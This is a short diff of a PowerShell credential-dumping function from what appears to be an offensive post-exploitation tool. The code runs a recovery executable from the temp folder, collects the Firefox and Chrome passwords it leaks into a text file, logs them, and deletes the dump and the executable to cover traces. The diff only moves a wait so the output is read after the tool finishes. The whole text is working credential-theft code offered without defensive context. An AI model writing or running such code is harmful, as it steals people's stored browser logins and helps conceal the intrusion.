@@ -857,11 +857,11 @@ function CREDS_DUMP {
     If(Test-Path "$env:tmp\DarkRCovery.exe"){
         $IPATH = pwd
         cd $env:tmp;./DarkRCovery.exe
-        $storecreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 8 # Wait for DarkRCovery to finish ..
         If(Test-Path "$env:tmp\Leaked.txt"){
+            $storecreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
             echo "`n`n[ Firefox|Chrome ]" >> $LogFilePath\BrowserEnum.log
             # Remove old files
-            Start-Sleep -Seconds 8 # Wait for DarkRcovery to finish ..
             Remove-Item "$env:tmp\Leaked.txt" -Force
             Remove-Item "$env:tmp\DarkRCovery.exe" -Force
             echo $storecreds >> $LogFilePath\BrowserEnum.log
